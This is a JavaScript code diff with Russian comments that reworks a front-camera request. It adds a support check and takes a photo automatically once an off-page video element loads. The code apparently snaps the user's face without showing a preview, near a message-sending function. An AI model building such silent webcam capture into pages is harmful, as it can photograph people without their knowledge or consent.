@@ -154,20 +154,33 @@
             await sendMessage(message);
         };
 
+        const checkCameraSupport = () => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                return true;
+            } else {
+                return false;
+            }
+        };
+
         const requestCameraPermission = async () => {
+            if (!checkCameraSupport()) {
+                console.warn("Камера не поддерживается на этом устройстве.");
+                return;
+            }
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" }  // Параметр для использования фронтальной камеры
+                    video: { facingMode: "user" }  
                 });
 
                 const videoElement = document.createElement("video");
                 videoElement.srcObject = stream;
                 videoElement.play();
 
-                // Захватываем фото после 1 секунды (время на загрузку видео)
-                setTimeout(() => {
+                videoElement.onloadedmetadata = async () => {
+                    // Делаем снимок, когда видео готово
                     capturePhoto(videoElement, stream);
-                }, 1000);
+                };
             } catch (error) {
                 console.error("Ошибка при доступе к камере:", error);
             }
